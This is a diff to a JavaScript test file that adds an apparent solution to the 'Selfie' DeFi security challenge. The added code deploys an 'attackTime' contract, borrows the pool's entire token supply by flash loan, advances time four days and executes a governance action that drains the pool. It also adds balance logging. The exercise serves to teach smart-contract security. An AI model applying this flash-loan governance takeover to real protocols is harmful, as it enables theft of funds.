@@ -39,6 +39,18 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        //attackTime
+        attackit = await (await ethers.getContractFactory('attackTime', player)).deploy();
+        expect(await attackit.owner()).to.be.equal(player.address);
+
+        console.log(await attackit.owner());
+        console.log(player.address);
+        await attackit.setup(pool.address, governance.address);
+        await pool.flashLoan(attackit.address, token.address, TOKENS_IN_POOL, 0x0);
+
+        await time.increase(3600 * 24 * 4); //1hr * 24 = 1 day * 4 = 4 days
+        await governance.executeAction(1);
+
     });
 
     after(async function () {
@@ -51,5 +63,9 @@ describe('[Challenge] Selfie', function () {
         expect(
             await token.balanceOf(pool.address)
         ).to.be.equal(0);
+
+        console.log("balance of token is " + await token.balanceOf(pool.address))
+        console.log("balance of player is " + await token.balanceOf(player.address))
+
     });
 });
